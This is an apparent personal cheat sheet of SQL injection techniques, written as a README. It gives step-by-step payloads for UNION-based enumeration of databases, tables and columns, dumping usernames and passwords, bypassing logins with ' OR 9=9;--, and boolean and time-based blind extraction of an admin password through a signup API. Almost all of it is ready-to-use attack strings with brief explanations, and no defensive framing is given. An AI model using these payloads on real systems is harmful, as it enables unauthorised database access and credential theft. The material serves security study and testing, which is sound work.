# Sql-injection
cheatsheet for some sql-injection tricks and commands i used before 

## To perfom successful sql injection attack :-

### First In-Band SQL Injection type :

- You need to figure out **how many columns** do you have by using :

>1 UNION SELECT 1,2,...

- When you figure out how many columns , you need to **break the query** to make union select print whatever data it will returned 

>0 UNION SELECT 1,2,3

- Now we need to know the **name of the database** 

>0 UNION SELECT 1,2,database()

- Now we need to **get the tables** in that database

>0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'teto_database'

- Now we know name of tables lets try to **get data from it** 

>0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'company_users'

- Lets get the passwords 

>0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM company_users

## Second Blind SQLi :
Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless. It might surprise you that all we need is that little bit of feedback to successful enumerate a whole database.

### Authentication Bypass :
you can do Authentication Bypass by trying to use OR statement and make true statement like 0=0 or 1=1 or 'a'='a' 
like if that was the sql command 

>select * from users where username='%username%' and password='%password%' LIMIT 1;

you can bypass it with something like : 
> ' OR 9=9;--

### Boolean Based :
Boolean based SQL Injection refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes.

Example : we have api that return to us if we can make username with that name or not 
>http://site.com/signup?check=kareem

if there is already someone called kareem , the api should return false value to us 
so we can do something like this 

>kareemx0' UNION SELECT 1;-- 

and see if the returned value was false thats mean we should put more numbers after the select to select the same amount of columns we need to select

>kareemx0' UNION SELECT 1,2,3;-- 

now we need to know the name of the database so we will use **like** command to try to guess the name of the DB 

>kareemx0' UNION SELECT 1,2,3 where database() like 'a%';--

if it starts with letter A it will return true if not it will return false , so we should keep guessing manually until we figure out or you can automate it by any script
lets say we figured out the name of the databas which is *mods* 
so lets use this command 

>kareemx0' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'mods' and table_name like 'a%';--

by using this we will start to guessing the name of table as we did before when we wanted to guess the name of the database , lets say the table called users
so lets use this 

>kareemx0' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='mods' and TABLE_NAME='users' and COLUMN_NAME like 'a%';

now we will start to guessing the name of columns but lets try to guessing names of any columns except the **id** column

>kareemx0' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='mods' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';

and we figure out that the column name is usernames , so now lets try to guess what is the password for the admin 

>kareemx0' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%

we will try to cycling through all the characters until we discover the password


### Time-Based :
A time-based blind SQL Injection is very similar to the above Boolean based, in that the same requests are sent,
but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. 
This time delay is introduced by using built-in methods such as SLEEP(x) alongside the UNION statement.
The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 

lets try to take our last example to explain the time based sql injection 

>kareemx0' UNION SELECT SLEEP(5),2;--

the response will come after 5 seconds 
so we can repeat our last steps from the last example "Boolean based" and the indicator will be the time like if the result is True it will sleep 5 seconds and if it was false it won't sleep the 5 seconds



